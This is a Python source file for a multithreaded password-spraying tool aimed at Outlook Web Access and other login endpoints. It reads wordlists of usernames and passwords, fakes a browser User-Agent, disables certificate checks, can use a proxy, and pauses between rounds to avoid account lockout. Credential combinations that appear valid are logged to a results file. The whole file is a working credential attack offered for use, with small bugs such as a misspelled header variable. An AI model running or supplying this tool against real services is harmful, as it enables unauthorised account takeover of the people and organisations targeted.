import time
import socket
import requests
import sys
import multiprocessing
import argparse
from functools import partial
import re
import urllib3
import os
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_THREADS = 10
DEFAULT_SLEEP = 3600
DEFAULT_PASS_TO_TRY = 2
DEFAULT_RESULT_FILENAME = 'spray_result.txt'
DEFAULT_METHOD = 'POST'
DEFAULT_HEADERS = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0'}
DEFAULT_JSON = False

class COLORS:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def get_data_from_wordlist(filepath):
    """Read wordlist line by line and store each line as a list entry."""
    with open(filepath) as f:
        content = f.readlines()
    # Remove whitespace characters like '\n' at the end of each line
    return [x.strip() for x in content]

def _args_check_port(value):
    """Check argument for valid port number."""
    min_port = 1
    max_port = 65535

    try:
        intvalue = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError('"%s" is an invalid port number.' % value)

    if intvalue < min_port or intvalue > max_port:
        raise argparse.ArgumentTypeError('"%s" is an invalid port number.' % value)
    return intvalue

def _args_check_data(value):
    senddata = value
    try:
        dictvalue = json.loads(senddata)
    except ValueError:
        dictvalue = dict((x.strip(), y.strip())
             for x, y in (element.split('=') 
             for element in senddata.split('&')))
    return dictvalue

def _args_check_proxy(value):
    proxy = value
    if "https://" in proxy:
        return {'https':proxy,'http':proxy}
    elif "http://" in proxy:
        return {'http':proxy,'https':proxy}
     

def _args_check_file(value):
    """Check argument for existing file."""
    strval = value
    if not os.path.isfile(strval):
        raise argparse.ArgumentTypeError('File "%s" not found.' % value)
    return strval



def _args_check_method(value):
    """Check argument for existing file."""
    strval = value.upper()
    if strval not in ['GET','POST','PUT']:
        raise argparse.ArgumentTypeError('"%s" is an invalid HTTP methpd' % value)
    return strval


def get_args():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        usage="""%(prog)s [options] -U host port
       %(prog)s --help
    """,
        description="OWA Spraying utility"
        )

    parser.add_argument(
        "-d",
        "--domain",
        metavar="domain",
        required=False,
        type=str,
        help="""Domain to prepend to users""",
    )
    parser.add_argument(
            "-de",
            "--domainasemail",
            metavar="domainasemail",
            required=False,
            type=bool,
            default=False,
            help="""Append domain as in email addresses""",
            )
    parser.add_argument(
        "-j",
        "--json",
        metavar="json",
        required=False,
        type=bool,
        default = DEFAULT_JSON,
        help="""Send json request""",
    )
   
    parser.add_argument(
        "-U",
        "--usernames",
        metavar="usernames",
        required=True,
        type=_args_check_file,
        help="Newline separated wordlist of users to test.",
    )
    parser.add_argument(
        "-M",
        "--method",
        metavar="method",
        required=False,
        type=_args_check_method,
        help="Newline separated wordlist of users to test.",
    )
    parser.add_argument(
        "-R",
        "--resultfilename",
        metavar="resultfilename",
        default = DEFAULT_RESULT_FILENAME,
        required=False,
        type=str,
        help="File to write results Default:"+DEFAULT_RESULT_FILENAME,
    )
    parser.add_argument(
        "-P",
        "--passwords",
        metavar="passwords",
        required=True,
        type=_args_check_file,
        help="Newline separated wordlist of passwords to test.",
    )
 
    parser.add_argument(
        "--delay",
        metavar="delay",
        required=False,
        default=DEFAULT_SLEEP,
        type=int,
        help="""Time to sleep between spraying sessions 
        Default: """
        + str(DEFAULT_SLEEP),
    )
    parser.add_argument(
        "--passwordsnum",
        metavar="passwordsnum",
        required=False,
        default=DEFAULT_PASS_TO_TRY,
        type=int,
        help="""Number of passwords to try in one spraying session
    Default: """
        + str(DEFAULT_PASS_TO_TRY),
    )
    parser.add_argument(
        "--threads",
        metavar="threads",
        required=False,
        default=DEFAULT_THREADS,
        type=int,
        help="""Number of concurrent threads.
    Default: """
        + str(DEFAULT_THREADS),
    )
    parser.add_argument(
        "--senddata",
        metavar="senddata",
        required=False,
        type=_args_check_data,
        help="Data to POST or GET: JSON and WWW-Form-URL-Encoded are supported",
    )
    parser.add_argument(
        "--condition",
        metavar="condition",
        required=True,
        type=str,
        help="Regex of string to find in incorrect username/password conbination response",
    )

    parser.add_argument(
        "--proxy",
        metavar="proxy",
        required=False,
        default = {},
        type=_args_check_proxy,
        help="Proxy to send requests through, e.g https://127.0.0.1:9000",
    )

    parser.add_argument("url", type=str, help="URL to spray.")
    return parser.parse_args()

def spray(username, password, url, method, senddata, condition, resultfile, proxy):
    
    s = requests.Session()
    r = None
    for key in senddata:
        if senddata[key] == "USERNAME":
            senddata[key] = username
        if senddata[key] == "PASSWORD":
            senddata[key] = password
    try:
        if method == 'GET':
            r = s.get(url, params=senddata, verify=False, headers=DEFAULT_HEADERS, allow_redirects=True, proxies=proxy)
        elif method == 'POST':
            r = s.post(url, data=senddata, verify=False, headers=DEFAULT_HEADERS, allow_redirects=True, proxies=proxy)
        elif method == 'PUT':
            r = s.put(url, data=senddata, verify=False,  headers=DEDAULT_HEADERS,allow_redirects=True, proxies=proxy)
    except Exception as e:
        print('[!!!!]'+str(e))
        with open(resultfile, 'a+') as rs:
            rs.write(str(e)+"\n")
    with open(resultfile, 'a+') as rs:
        try:
            if re.findall(condition, r.text):
                print('[----] Incorrect combination {}:{}'.format(username, password))
                rs.write('[----] Incorrect combination {}:{}\n'.format(username, password))
            else:
                print('[SUCC] Possible combination found {}:{}'.format(username, password))
                rs.write('[SUCC] Possible combination found {}:{}\n'.format(username, password))
        except Exception as e:
            print('[!!!!]'+str(e))
def main():
    bcolors = COLORS()
    args = get_args()
    if args.json:
    	DEFAULT_HEADERS.update({'Content-Type':'application/json'})
    i = 0
    usernames = get_data_from_wordlist(args.usernames)
    passwords = get_data_from_wordlist(args.passwords)
    if args.domain:
        if args.domainasemail:
            usernames = [x+"@"+args.domain for x in usernames]
        else:
            usernames = [args.domain+"\\"+ x for x in usernames]
    for p in passwords:
        print("[+] Testing password {}".format(p))
        fnc = partial(spray, password=p, url=args.url, method=args.method, senddata=args.senddata, condition=args.condition, resultfile=args.resultfilename, proxy=args.proxy)
        pool = multiprocessing.Pool(processes=args.threads)
        
        pool_outputs = pool.map(fnc, usernames)

        pool.close()
        pool.join()
        i = i + 1
        if i == args.passwordsnum: 
            print("[~] Sleeping {}s...".format(args.delay))
            time.sleep(args.delay)
            print("[~] Continuing")
            i = 0

if __name__ == "__main__":
    # Catch Ctrl+c and exit without error message
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(1)
                           
